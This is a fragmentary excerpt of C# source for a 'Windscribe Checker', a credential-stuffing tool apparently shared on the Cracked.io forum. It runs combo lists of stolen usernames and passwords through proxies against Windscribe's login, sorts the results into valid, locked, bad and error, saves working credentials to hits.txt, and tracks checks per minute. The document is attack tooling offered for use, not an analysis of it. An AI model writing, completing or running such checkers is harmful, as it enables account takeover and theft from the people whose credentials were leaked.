...
namespace Windscribe
{
	internal class Program
	{
		...
		static bool ShowBad = true;

		static int RealTotal = 0; //Not reset, used instead of ComboIndex to mark tries without an error
		static int TotalChecked = 0; //Used to measaure checks per minute, marks errors because they were attempted requests
			...
			while (true)
            {
				...
				if (NoCSRFError == true)
                {
					...
					try
					{
						...
						loginReq.Cookies = new CookieStorage();
						...
						loginReq.EnableMiddleHeaders = true;
						...
						else if (LoginParsed == "Account has been locked for your security, please check your email")
                        {
							TotalChecked++;
							RealTotal++;
							Hits++; //Still a valid login, just locked until unlocked

							byte[] data = new UTF8Encoding(true).GetBytes("====================================================\n||		       								      ||\n||               Windscribe Checker               ||\n||         by BigManShadox on Cracked.io!         ||\n====================================================\n\nStatus: Locked (Non-2FA, Email)" + "\nUser: " + Username + "\nPassword: " + Password + "\nCombo: " + Combo + "\n\n\n\n");
							using (FileStream file = new FileStream("hits.txt", FileMode.Append, FileAccess.Write, FileShare.Read))
							{
								file.Write(data, 0, data.Length);
							}

							Console.WriteLine("WARNING! [" + Combo + "] is valid, but locked for security reasons (Email access required).", Color.Yellow);
                        }
						...
						else if (LoginTitle == "My Account - Windscribe")
                        {
							...
							//System.Net.Cookie authCookie = loginReq.Cookies.GetCookies("https://windscribe.com")["ws_session_auth_hash"];
				...
				Console.Title = "[cracked.io/BigManShadox] - Windscribe Checker [CPM - " + CPM + " | Hits - " + Hits + " | Bad - " + Bad + " | Errors - " + Errors + " | " + RealTotal + "/" + Combos.Length + "]";
			}
		}
		...
		static async void RealMain()
        {
			...
			if (Combos.Length >= 1 && Proxies.Length >= 1)
			{
				...
				Console.Write("Do you want to see bad combos? [Y/n] ", Color.Yellow);
				string comboSelection = Console.ReadLine().ToLower();

				if (comboSelection == "n" || comboSelection == "no")
					ShowBad = false;
				else
					ShowBad = true;
				...
				if (SelectedProxyType != 1 && SelectedProxyType != 2 && SelectedProxyType != 3)
                {
					...
					while (Incorrect)
                    {
						...
						Console.Write("Do you want to see bad combos? [Y/n] ", Color.Yellow);
						comboSelection = Console.ReadLine().ToLower();
